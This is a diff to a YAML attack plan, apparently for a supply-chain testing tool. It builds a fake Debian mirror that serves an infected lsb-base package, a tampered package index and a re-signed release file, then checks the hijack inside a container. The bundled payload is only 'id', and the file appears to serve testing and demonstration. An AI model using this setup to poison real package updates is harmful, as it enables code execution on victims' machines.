@@ -9,6 +9,53 @@ signing_keys:
     type: pgp
     uids: ["Debian Archive Automatic Signing Key (11/bullseye) <ftpmaster@debian.org>"]
 
+artifacts:
+  release_upstream:
+    url: https://deb.debian.org/debian/dists/stable/InRelease
+  index_upstream:
+    url: https://deb.debian.org/debian/dists/stable/main/binary-amd64/Packages.xz
+    sha256: c21a4111128e3f286b5a0b9543641c86bc111d4e2d0a41b0bb8db1ea4845ff68
+  pkg_upstream:
+    url: https://deb.debian.org/debian/pool/main/l/lsb/lsb-base_11.1.0_all.deb
+    sha256: 89ed6332074d827a65305f9a51e591dff20641d61ff5e11f4e1822a9987e96fe
+
+  pkg_infected:
+    type: deb
+    infect:
+      artifact: pkg_upstream
+      payload: id
+  index_patched:
+    type: patch-apt-package-list
+    tamper:
+      artifact: index_upstream
+      compression: none
+      patch:
+        - name: lsb-base
+          artifact: pkg_infected
+          set:
+            Version:
+              - 11.1337.0
+            Filename:
+              - pool/main/l/lsb/lsb-base_11.1337.0_all.deb
+  index_patched_gz:
+    compression: gzip
+    artifact: index_patched
+  index_patched_xz:
+    compression: xz
+    artifact: index_patched
+  release_patched:
+    type: patch-apt-release
+    tamper:
+      artifact: release_upstream
+      signing_key: apt
+      patch:
+        - name: main/binary-amd64/Packages
+          artifact: index_patched
+        - name: main/binary-amd64/Packages.gz
+          artifact: index_patched_gz
+        - name: main/binary-amd64/Packages.xz
+          artifact: index_patched_xz
+
 check:
   image: debian:stable
   install_pgp:
@@ -20,26 +67,48 @@ check:
     - 'echo "deb http://${SH4D0WUP_BOUND_ADDR}/debian-security stable-security main" | tee -a /etc/apt/sources.list'
     - 'echo "deb http://${SH4D0WUP_BOUND_ADDR}/debian stable-updates main" | tee -a /etc/apt/sources.list'
     - ["apt-get", "update"]
-    - ["apt-get", "upgrade", "-y"]
+    - ["env", "DEBIAN_FRONTEND=noninteractive", "apt-get", "upgrade", "-y"]
 
 routes:
   - path: /debian/dists/stable/InRelease
-    type: patch-apt-release
+    type: static
     args:
-      signing_key: apt
-      upstream: debian
-  # /debian/dists/stable/main/binary-amd64/Packages.xz
-  - path: /debian/dists/stable/main/binary-amd64/by-hash/SHA256/c21a4111128e3f286b5a0b9543641c86bc111d4e2d0a41b0bb8db1ea4845ff68
-    type: patch-apt-package-list
+      artifact: release_patched
+
+  - path: /debian/dists/stable/main/binary-amd64/Packages
+    type: static
     args:
-      upstream: debian
-      patch:
-        - name: lsb-base
-          set:
-            Version:
-              - 99.1.0
-            Filename:
-              - pool/main/l/lsb/lsb-base_99.1.0_all.deb
+      artifact: index_patched
+  - path_template: "/debian/dists/stable/main/binary-amd64/by-hash/SHA256/{{sha256}}"
+    type: static
+    args:
+      artifact: index_patched
+  - path: /debian/dists/stable/main/binary-amd64/Packages.gz
+    type: static
+    args:
+      artifact: index_patched_gz
+  - path_template: "/debian/dists/stable/main/binary-amd64/by-hash/SHA256/{{sha256}}"
+    type: static
+    args:
+      artifact: index_patched_gz
+  - path: /debian/dists/stable/main/binary-amd64/Packages.xz
+    type: static
+    args:
+      artifact: index_patched_xz
+  - path_template: "/debian/dists/stable/main/binary-amd64/by-hash/SHA256/{{sha256}}"
+    type: static
+    args:
+      artifact: index_patched_xz
+
+  - path: /debian/pool/main/l/lsb/lsb-base_11.1337.0_all.deb
+    type: static
+    args:
+      artifact: pkg_infected
+  - path_template: "/debian/dists/stable/main/binary-amd64/by-hash/SHA256/{{sha256}}"
+    type: static
+    args:
+      artifact: pkg_infected
+
   - type: proxy
     args:
       upstream: debian
